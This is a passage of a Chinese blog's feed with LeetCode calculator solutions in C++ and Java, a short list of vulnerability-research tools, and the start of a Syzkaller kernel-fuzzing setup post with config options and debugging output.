class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;recognizing space\n&quot;</span>);</span><br><span class="line">                p++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">switch</span>(state)&#123;</span><br><span class="line">                <span class="keyword">case</span> NUMBER:&#123;</span><br><span class="line">                    <span class="comment">// 检查符号栈</span></span><br><span class="line">                    <span class="type">long</span> num=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> (p &lt; s.<span class="built_in">length</span>() &amp;&amp; s[p] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[p] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                        num = num * <span class="number">10</span> + s[p] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                        p++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;num: %ld\n&quot;</span>,num);</span><br><span class="line">                    <span class="keyword">if</span>(stack_ops.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(num);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;stack_nums.back():%d\n&quot;</span>,stack_nums.<span class="built_in">back</span>());</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;stack_ops.back(): %c\n&quot;</span>,stack_ops.<span class="built_in">back</span>());</span><br><span class="line">                    <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;+&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(x+num);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(x-num);</span><br><span class="line">                    &#125;                   </span><br><span class="line">                    <span class="keyword">else</span> stack_nums.<span class="built_in">push_back</span>(num);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> LEFT_PARENTHESE:</span><br><span class="line">                    stack_ops.<span class="built_in">push_back</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">                    p++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> RIGHT_PARENTHESE:</span><br><span class="line">                    <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;+&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        <span class="type">int</span> y = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(x+y);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        <span class="type">int</span> y = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(y-x);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;now it shoud be (: %c\n&quot;</span>,stack_ops.<span class="built_in">back</span>());</span><br><span class="line">                    stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                    p++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> OP:</span><br><span class="line">                    stack_ops.<span class="built_in">push_back</span>(s[p++]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!stack_ops.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;+&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        <span class="type">int</span> y = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(x+y);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(stack_ops.<span class="built_in">back</span>()==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">                        <span class="type">int</span> x = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        <span class="type">int</span> y = stack_nums.<span class="built_in">back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_ops.<span class="built_in">pop_back</span>();</span><br><span class="line">                        stack_nums.<span class="built_in">push_back</span>(y-x);</span><br><span class="line">                    &#125;                </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack_nums.<span class="built_in">back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>题解中的类似思路的支持各种运算符的简单解和通解，解决我上面测例挂的思路也简单粗暴，就是对可能的情况做替换。另外，这个题解也不是规约，按照规约的话应该是数字入栈去做消除，它是在操作入栈的时候直接对栈做完全计算。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">replace</span><span class="params">(string&amp; s)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> pos = s.<span class="built_in">find</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (pos != <span class="number">-1</span>) &#123;</span><br><span class="line">            s.<span class="built_in">replace</span>(pos, <span class="number">1</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            pos = s.<span class="built_in">find</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">calculate</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 存放所有的数字</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">        <span class="comment">// 为了防止第一个数为负数，先往 nums 加个 0</span></span><br><span class="line">        nums.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 将所有的空格去掉</span></span><br><span class="line">        <span class="built_in">replace</span>(s);</span><br><span class="line">        <span class="comment">// 存放所有的操作，包括 +/-</span></span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; ops;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">char</span> c = s[i];</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                ops.<span class="built_in">push</span>(c);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 计算到最近一个左括号为止</span></span><br><span class="line">                <span class="keyword">while</span>(!ops.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                    <span class="type">char</span> op = ops.<span class="built_in">top</span>();</span><br><span class="line">                    <span class="keyword">if</span>(op != <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                        <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        ops.<span class="built_in">pop</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isdigit</span>(c)) &#123;</span><br><span class="line">                    <span class="type">int</span> cur_num = <span class="number">0</span>;</span><br><span class="line">                    <span class="type">int</span> j = i;</span><br><span class="line">                    <span class="comment">// 将从 i 位置开始后面的连续数字整体取出，加入 nums</span></span><br><span class="line">                    <span class="keyword">while</span>(j &lt;n &amp;&amp; <span class="built_in">isdigit</span>(s[j]))</span><br><span class="line">                        cur_num = cur_num*<span class="number">10</span> + (s[j++] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    <span class="comment">// 注意上面的计算一定要有括号，否则有可能会溢出</span></span><br><span class="line">                    nums.<span class="built_in">push</span>(cur_num);</span><br><span class="line">                    i = j<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; (s[i - <span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span> || s[i - <span class="number">1</span>] == <span class="string">&#x27;+&#x27;</span> || s[i - <span class="number">1</span>] == <span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">                        nums.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 有一个新操作要入栈时，先把栈内可以算的都算了</span></span><br><span class="line">                    <span class="keyword">while</span>(!ops.<span class="built_in">empty</span>() &amp;&amp; ops.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                        <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">                    ops.<span class="built_in">push</span>(c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!ops.<span class="built_in">empty</span>())</span><br><span class="line">            <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">calc</span><span class="params">(stack&lt;<span class="type">int</span>&gt; &amp;nums, stack&lt;<span class="type">char</span>&gt; &amp;ops)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>() &lt; <span class="number">2</span> || ops.<span class="built_in">empty</span>())</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> b = nums.<span class="built_in">top</span>(); nums.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">int</span> a = nums.<span class="built_in">top</span>(); nums.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="type">char</span> op = ops.<span class="built_in">top</span>(); ops.<span class="built_in">pop</span>();</span><br><span class="line">        nums.<span class="built_in">push</span>(op == <span class="string">&#x27;+&#x27;</span> ? a+b : a-b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;()&#123;&#123;</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;-&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;+&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;*&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;/&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;%&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">put</span>(<span class="string">&#x27;^&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">int</span> <span class="title">calculate</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        s = s.<span class="built_in">replaceAll</span>(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">char</span>[] cs = s.<span class="built_in">toCharArray</span>();</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        Deque&lt;Integer&gt; nums = <span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line">        nums.<span class="built_in">addLast</span>(<span class="number">0</span>);</span><br><span class="line">        Deque&lt;Character&gt; ops = <span class="keyword">new</span> ArrayDeque&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">char</span> c = cs[i];</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                ops.<span class="built_in">addLast</span>(c);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!ops.<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ops.<span class="built_in">peekLast</span>() != <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                        <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ops.<span class="built_in">pollLast</span>();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">isNumber</span>(c)) &#123;</span><br><span class="line">                    <span class="type">int</span> u = <span class="number">0</span>;</span><br><span class="line">                    <span class="type">int</span> j = i;</span><br><span class="line">                    <span class="keyword">while</span> (j &lt; n &amp;&amp; <span class="built_in">isNumber</span>(cs[j])) u = u * <span class="number">10</span> + (cs[j++] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    nums.<span class="built_in">addLast</span>(u);</span><br><span class="line">                    i = j - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; (cs[i - <span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span> || cs[i - <span class="number">1</span>] == <span class="string">&#x27;+&#x27;</span> || cs[i - <span class="number">1</span>] == <span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">                        nums.<span class="built_in">addLast</span>(<span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> (!ops.<span class="built_in">isEmpty</span>() &amp;&amp; ops.<span class="built_in">peekLast</span>() != <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                        <span class="type">char</span> prev = ops.<span class="built_in">peekLast</span>();</span><br><span class="line">                        <span class="keyword">if</span> (map.<span class="built_in">get</span>(prev) &gt;= map.<span class="built_in">get</span>(c)) &#123;</span><br><span class="line">                            <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ops.<span class="built_in">addLast</span>(c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!ops.<span class="built_in">isEmpty</span>() &amp;&amp; ops.<span class="built_in">peekLast</span>() != <span class="string">&#x27;(&#x27;</span>) <span class="built_in">calc</span>(nums, ops);</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">peekLast</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">calc</span><span class="params">(Deque&lt;Integer&gt; nums, Deque&lt;Character&gt; ops)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">isEmpty</span>() || nums.<span class="built_in">size</span>() &lt; <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (ops.<span class="built_in">isEmpty</span>()) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span> b = nums.<span class="built_in">pollLast</span>(), a = nums.<span class="built_in">pollLast</span>();</span><br><span class="line">        <span class="type">char</span> op = ops.<span class="built_in">pollLast</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (op == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">            ans = a + b;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            ans = a - b;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            ans = a * b;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            ans = a / b;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;^&#x27;</span>) &#123;</span><br><span class="line">            ans = (<span class="type">int</span>)Math.<span class="built_in">pow</span>(a, b);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">            ans = a % b;</span><br><span class="line">        &#125;</span><br><span class="line">        nums.<span class="built_in">addLast</span>(ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">boolean <span class="title">isNumber</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Character.<span class="built_in">isDigit</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>链表</h1><p>k个一组翻转链表</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;lc的输入传引用，并且无需自己设计输入输出格式，只需要实现核心函数即可&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;考虑在每个方向上都做1-2道题。&lt;/p&gt;
&lt;h1&gt;数组操作&lt;/h1&gt;
&lt;p&gt;1-3：数组操作，双指针为主，C++上学期考完csp已经手</summary>
      
    
    
    
    
    <category term="算法" scheme="https://zjw1nd.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘入门（持续更新）</title>
    <link href="https://zjw1nd.github.io/2025/03/28/SRC%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/03/28/SRC%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-03-28T09:10:24.000Z</published>
    <updated>2025-04-30T07:44:09.022Z</updated>
    
    <content type="html"><![CDATA[<h1>Fuzz</h1><p>Syzkaller 各种内核fuzz<br>afl++<br>libfuzzer</p><h1>自动化（静态）</h1><p>Ghidra10.1.2 binabsinspector插件，科恩的</p><h1>Web漏扫</h1><p>msf</p><h1>代码审计</h1><p>Fortify<br>CodeQL</p><h1>数据库</h1><p>参考github star内容现场搜索</p><p>Squirrel C++数万行（）<br>sqlfuzz…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Fuzz&lt;/h1&gt;
&lt;p&gt;Syzkaller 各种内核fuzz&lt;br&gt;
afl++&lt;br&gt;
libfuzzer&lt;/p&gt;
&lt;h1&gt;自动化（静态）&lt;/h1&gt;
&lt;p&gt;Ghidra10.1.2 binabsinspector插件，科恩的&lt;/p&gt;
&lt;h1&gt;Web漏扫&lt;/h1&gt;
&lt;p</summary>
      
    
    
    
    <category term="Exploits" scheme="https://zjw1nd.github.io/categories/Exploits/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="web" scheme="https://zjw1nd.github.io/tags/web/"/>
    
    <category term="fuzz" scheme="https://zjw1nd.github.io/tags/fuzz/"/>
    
    <category term="exploit" scheme="https://zjw1nd.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>内核fuzzing--Syzkaller初探</title>
    <link href="https://zjw1nd.github.io/2025/03/24/%E5%86%85%E6%A0%B8fuzzing-Syzkaller%E5%88%9D%E6%8E%A2/"/>
    <id>https://zjw1nd.github.io/2025/03/24/%E5%86%85%E6%A0%B8fuzzing-Syzkaller%E5%88%9D%E6%8E%A2/</id>
    <published>2025-03-24T08:33:28.000Z</published>
    <updated>2025-03-30T08:01:26.347Z</updated>
    
    <content type="html"><![CDATA[<h1>环境配置</h1><h2 id="内核编译">内核编译</h2><p>内核需要开启的选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_DEBUG_INFO=y # 其他的debug信息可以自行选择</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line"># 不开下面的这俩qemu中systemd会报错挂不上文件系统</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br><span class="line"># 内置cmdline解决没网卡/无法联网的问题，也可以在syz-manager的cfg文件里配置</span><br><span class="line">CONFIG_CMDLINE_BOOL=y</span><br><span class="line">CONFIG_CMDLINE=&quot;net.ifnames=0&quot;</span><br></pre></td></tr></table></figure><h2 id="disk-image">disk image</h2><p>disk image用官方提供的脚本，当然又有挂载相关的问题，有了上次的经验直接用docker跑应该就行。</p><h2 id="fuzz跑不动">fuzz跑不动</h2><p>连不上机器，查看日志说是fuzz执行syz-executor的时候segfault，gdb调了以下看了眼backtrace，pie的问题？这玩意不是静态编译的吗？遂上网搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[  451.736541] syz-executor[249]: segfault at 7f6b8b5df3f8 ip 00007f6b8bb6b090 sp 00007ffde599aaa0 error 4 in syz-executor[7f6b8b9e7000+1]</span><br><span class="line">[  451.738294] Code: 08 66 0f d4 c1 4c 8b 51 08 66 49 0f 7e c0 4b 8d 0c 2a 4c 0f 45 d1 48 39 d8 73 3b 66 66 2e 0f 1f 84 00 00 00 00 00 0fb</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────</span><br><span class="line"> ► 0x7ffff71cc090 &lt;_dl_relocate_static_pie+1040&gt;    mov    rcx, qword ptr [rax]         &lt;Cannot dereference [0x7ffff6c403f8]&gt;</span><br><span class="line">   0x7ffff71cc093 &lt;_dl_relocate_static_pie+1043&gt;    mov    edx, dword ptr [rax + 8]</span><br><span class="line">   0x7ffff71cc096 &lt;_dl_relocate_static_pie+1046&gt;    add    rcx, r13</span><br><span class="line">   0x7ffff71cc099 &lt;_dl_relocate_static_pie+1049&gt;    cmp    rdx, 0x26</span><br><span class="line">   0x7ffff71cc09d &lt;_dl_relocate_static_pie+1053&gt;    je     _dl_relocate_static_pie+1065 &lt;_dl_relocate_static_pie+1065&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff71cc09f &lt;_dl_relocate_static_pie+1055&gt;    cmp    rdx, 8</span><br><span class="line">   0x7ffff71cc0a3 &lt;_dl_relocate_static_pie+1059&gt;    jne    _dl_relocate_static_pie.cold+62 &lt;_dl_relocate_static_pie.cold+62&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff71cc0a9 